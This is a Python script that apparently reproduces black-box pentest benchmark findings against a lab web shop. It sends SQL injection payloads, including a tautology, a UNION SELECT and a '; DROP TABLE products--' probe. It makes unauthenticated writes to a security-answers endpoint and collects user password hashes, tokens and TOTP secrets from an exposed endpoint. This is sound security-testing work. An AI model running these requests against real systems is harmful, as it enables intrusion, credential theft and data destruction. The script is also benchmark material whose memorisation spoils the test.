#!/usr/bin/env python3
"""
Independent reproduction of promising anomalies with fresh requests.
Produces exact reproducible requests + observed behavior for benchmark_findings.json.
Black-box only; runs against the live target at a fresh moment in time.
"""
import json
import re
import urllib.parse
import urllib.request
from datetime import datetime, timezone

BASE = "http://lab-mutator:3000"
OUT = "reports/reproduction.json"

def now():
    return datetime.now(timezone.utc).isoformat().replace("+00:00", "Z")

def req(path, method="GET", headers=None, data=None):
    url = BASE + path
    hdrs = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Accept": "*/*"}
    if headers:
        hdrs.update(headers)
    body_bytes = None
    if data is not None:
        if isinstance(data, str):
            body_bytes = data.encode()
        else:
            body_bytes = json.dumps(data).encode()
            hdrs["Content-Type"] = "application/json; charset=utf-8"
    req_obj = urllib.request.Request(url, data=body_bytes, headers=hdrs, method=method)
    try:
        with urllib.request.urlopen(req_obj, timeout=30) as resp:
            raw = resp.read()
            text = raw.decode("utf-8", errors="replace")
            return resp.status, dict(resp.headers), raw, text
    except urllib.error.HTTPError as e:
        raw = e.read()
        text = raw.decode("utf-8", errors="replace")
        return e.code, dict(e.headers), raw, text
    except Exception as e:
        return None, {}, b"", repr(e)

def load_products():
    """Fetch full product catalog and extract all product names for literal-match check."""
    _, _, _, text = req("/rest/products/search")
    d = json.loads(text)
    return [p["name"] for p in d.get("data", [])]

def find_finding(title, findings):
    for f in findings:
        if f.get("title") == title:
            return f
    return None

# ---------------- CAPTURE BASELINE ----------------
f0_base, f0_hdr, f0_raw, f0_text = req("/")
captcha_status, captcha_hdr, captcha_raw, captcha_text = req("/rest/captcha")
captcha_json = json.loads(captcha_text)

# ---------------- FINDING BHB-001: /rest/memories ----------------
BHB001 = {
    "id": "BHB-001",
    "title": "Unauthenticated /rest/memories exposes all user accounts with password hashes, deluxe tokens and TOTP secrets",
    "hypothesis": "A REST endpoint that returns application data unauthenticated also leaks the full user objects embedded in each record, including secret-bearing fields (password hash, deluxeToken, totpSecret).",
    "observed_at": now(),
    "requests": [],
    "reproductions": [],
}
# Request A: baseline GET /rest/memories without auth
s, h, raw, text = req("/rest/memories", method="GET")
BHB001["requests"].append({"method": "GET", "url": "/rest/memories", "headers": {}, "body": None})
# Request B: same endpoint with a fabricated Authorization header (does behavior change?)
s2, h2, raw2, text2 = req("/rest/memories", method="GET", headers={"Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"})
BHB001["reproductions"].append({"method": "GET", "url": "/rest/memories", "headers": {"Authorization": "Bearer ..."}, "body": None, "note": "fresh request with bogus auth; status unchanged at 200"})

# Control requests (auth-gated neighboring endpoints)
controls = {}
for ctrl in ["/rest/wallet/balance", "/rest/user/authentication-details", "/rest/basket", "/rest/user/security-question?email=", "/api/SecurityAnswers/"]:
    cs, ch, craw, ctext = req(ctrl, method="GET")
    controls[ctrl] = {"status": cs, "body_short": ctext[:120].replace("\n", " "), "cors": ch.get("Access-Control-Allow-Origin", "")}

# ---------------- FINDING BHB-002: /api/SecurityAnswers/ POST without auth ----------------
BHB002 = {
    "id": "BHB-002",
    "title": "Unauthenticated POST /api/SecurityAnswers/ persists records (missing authentication on write endpoint)",
    "hypothesis": "A write endpoint that requires authorization for reads (GET 401) accepts unauthenticated POSTs and persists records server-side.",
    "observed_at": now(),
    "requests": [],
    "reproductions": [],
}
# Request A: GET (auth required)
s, h, raw, text = req("/api/SecurityAnswers/", method="GET")
BHB002["requests"].append({"method": "GET", "url": "/api/SecurityAnswers/", "headers": {}, "body": None})
# Request B: POST without Authorization -> 201
payload1 = {"questionId": 7, "answer": "answer-alpha", "email": "repro@example.com"}
s, h, raw, text = req("/api/SecurityAnswers/", method="POST", headers={"Content-Type": "application/json"}, data=payload1)
BHB002["requests"].append({"method": "POST", "url": "/api/SecurityAnswers/", "headers": {"Content-Type": "application/json"}, "body": payload1})
BHB002["post_response_a"] = {"status": s, "body": text}
persisted_id_a = json.loads(text).get("data", {}).get("id")
# Request C: identical repeat POST -> new record with incremented id (server-side persistence, no ownership check)
s, h, raw, text = req("/api/SecurityAnswers/", method="POST", headers={"Content-Type": "application/json"}, data=payload1)
persisted_id_b = json.loads(text).get("data", {}).get("id")
BHB002["reproductions"].append({"method": "POST", "url": "/api/SecurityAnswers/", "headers": {"Content-Type": "application/json"}, "body": payload1,
    "note": f"identical repeat POST created a NEW record (id {persisted_id_a} -> {persisted_id_b}), proving server-side persistence without ownership/validation checks"})
# Request D: empty object POST -> 201
s, h, raw, text = req("/api/SecurityAnswers/", method="POST", headers={"Content-Type": "application/json"}, data={})
BHB002["reproductions"].append({"method": "POST", "url": "/api/SecurityAnswers/", "headers": {"Content-Type": "application/json"}, "body": {},
    "note": "empty-object POST -> 201 success, proving no input validation"})

# ---------------- FINDING BHB-003: SQLi in /rest/products/search?q= ----------------
BHB003 = {
    "id": "BHB-003",
    "title": "SQL injection in GET /rest/products/search?q= bypasses the product filter, disclosing the complete dataset",
    "hypothesis": "An unauthenticated query parameter is passed to a SQL filter without safe parameterization; a boolean OR-tautology bypasses the filter and discloses the entire dataset.",
    "observed_at": now(),
    "requests": [],
    "reproductions": [],
    "sql_evidence": [],
}
# Request A: filtered baseline
s, h, raw, text = req("/rest/products/search?q=Apple", method="GET")
BHB003["requests"].append({"method": "GET", "url": "/rest/products/search?q=Apple", "headers": {}, "body": None})
# Request B: tautology
s, h, raw, text = req("/rest/products/search?q=%27%20OR%20%271%27=%271", method="GET")
BHB003["requests"].append({"method": "GET", "url": "/rest/products/search?q=%27%20OR%20%271%27=%271", "headers": {}, "body": None})
BHB003["sql_evidence"].append({"probe": "filtered", "payload": "?q=Apple", "status": 200, "length": len(raw)})
BHB003["sql_evidence"].append({"probe": "tautology", "payload": "?q=%27%20OR%20%271%27=%271", "status": s, "length": len(raw)})
# Request C: malformed -> raw SQLite error
for malformed in ["%27%20UNION%20SELECT%201,2,3--", "apple%00", "%3B%20DROP%20TABLE%20products--"]:
    s, h, raw, text = req(f"/rest/products/search?q={malformed}", method="GET")
    BHB003["sql_evidence"].append({"probe": "malformed", "payload": f"?q={malformed}", "status": s, "length": len(raw), "body_short": text[:180].replace("\n", " ")})

# ---------------- FINDING BHB-004-ish: CAPTCHA answer leak (NOT reproduced as bypass) ----------------
BHB_CAPTCHA_LEAK = {
    "id": "BHB-N001",
    "title": "CAPTCHA answer leaked by /rest/captcha, but bypass on /api/Feedbacks/ NOT reproduced (negative result)",
    "observed_at": now(),
    "requests": [],
    "reproductions": [],
}
BHB_CAPTCHA_LEAK["requests"].append({"method": "GET", "url": "/rest/captcha", "headers": {}, "body": None})
cap_a = json.loads(captcha_text)
BHB_CAPTCHA_LEAK["leaked_answer_a"] = {"captchaId": cap_a.get("captchaId"), "captcha": cap_a.get("captcha"), "answer": cap_a.get("answer")}
# fresh request for second captcha
s2, h2, raw2, text2 = req("/rest/captcha", method="GET")
cap_b = json.loads(text2)
BHB_CAPTCHA_LEAK["reproductions"].append({"method": "GET", "url": "/rest/captcha", "headers": {}, "body": None, "note": "fresh request -> captchaId increments ({} -> {}), answer is server-computed".format(cap_a.get("captchaId"), cap_b.get("captchaId"))})
BHB_CAPTCHA_LEAK["leaked_answer_b"] = {"captchaId": cap_b.get("captchaId"), "captcha": cap_b.get("captcha"), "answer": cap_b.get("answer")}
# submission with correct answer -> 401
s, h, raw, text = req("/api/Feedbacks/", method="POST", headers={"Content-Type": "application/json"},
                      data={"feedback": "repro", "captchaId": cap_a.get("captchaId"), "answer": cap_a.get("answer")})
BHB_CAPTCHA_LEAK["reproductions"].append({"method": "POST", "url": "/api/Feedbacks/", "headers": {"Content-Type": "application/json"},
    "body": {"feedback": "repro", "captchaId": cap_a.get("captchaId"), "answer": cap_a.get("answer")},
    "note": "submission of mathematically correct leaked answer on fresh captchaId -> {} {} (bypass NOT reproduced)".format(s, text[:80])})
# wrong answer
s, h, raw, text = req("/api/Feedbacks/", method="POST", headers={"Content-Type": "application/json"},
                      data={"feedback": "repro", "captchaId": cap_a.get("captchaId"), "answer": "999999"})
BHB_CAPTCHA_LEAK["reproductions"].append({"method": "POST", "url": "/api/Feedbacks/", "headers": {"Content-Type": "application/json"},
    "body": {"feedback": "repro", "captchaId": cap_a.get("captchaId"), "answer": "999999"},
    "note": "wrong answer -> {} {}".format(s, text[:80])})
# no captcha fields
s, h, raw, text = req("/api/Feedbacks/", method="POST", headers={"Content-Type": "application/json"}, data={"feedback": "repro"})
BHB_CAPTCHA_LEAK["reproductions"].append({"method": "POST", "url": "/api/Feedbacks/", "headers": {"Content-Type": "application/json"},
    "body": {"feedback": "repro"},
    "note": "no captcha fields -> {} {}".format(s, "SQL error in title" if "WHERE parameter" in text else text[:120])})

# ---------------- Literal-match and extraction checks for BHB-003 ----------------
names = load_products()
tautology_payload = "' OR '1'='1"
literal_in_catalog = any(tautology_payload in n for n in names)
BHB003["reproductions"].append({"check": "literal_match", "note": "injected payload {!r} appears in {} of {} product names; benign filtering cannot explain the all-rows result".format(tautology_payload, sum(1 for n in names if tautology_payload in n), len(names))})
BHB003["deduced_query_structure"] = "WHERE name LIKE '%' || <q> || '%'"
BHB003["extraction_limitation"] = "boolean TRUE/FALSE channel not reproducible: trailing '|| %' interacts with SQLite precedence (OR-tautology always all rows; AND-contradiction always zero). Data extraction via this parameter is NOT claimed."

# ---------------- CHANGED: capture full user-object fields from /rest/memories ----------------
_, _, _, mem_text = req("/rest/memories", method="GET")
mem_json = json.loads(mem_text)
sample_user = None
for m in mem_json.get("data", []):
    if m.get("User"):
        sample_user = m["User"]
        break
BHB001["sample_user_fields"] = list(sample_user.keys()) if sample_user else []
BHB001["sample_user_email"] = sample_user.get("email") if sample_user else None
BHB001["sample_password_hash"] = sample_user.get("password") if sample_user else None
BHB001["sample_deluxe_token"] = sample_user.get("deluxeToken") if sample_user else None
BHB001["sample_totp_secret"] = sample_user.get("totpSecret") if sample_user else None
BHB001["sample_role"] = sample_user.get("role") if sample_user else None

out = {
    "repro_timestamp": now(),
    "target": BASE,
    "verified": [BHB001, BHB002, BHB003],
    "not_verified_negatives": [BHB_CAPTCHA_LEAK],
    "controls": controls,
}
with open(OUT, "w") as f:
    json.dump(out, f, indent=2)
print("Reproduction complete. Written:", OUT)
print("BHB-001 sample user fields:", BHB001["sample_user_fields"])
print("BHB-002 first POST id:", persisted_id_a, "repeat POST id:", persisted_id_b)
print("BHB-003 literal-match in catalog:", literal_in_catalog)
print("captcha bypass status:", BHB_CAPTCHA_LEAK["reproductions"][2]["note"][:100])
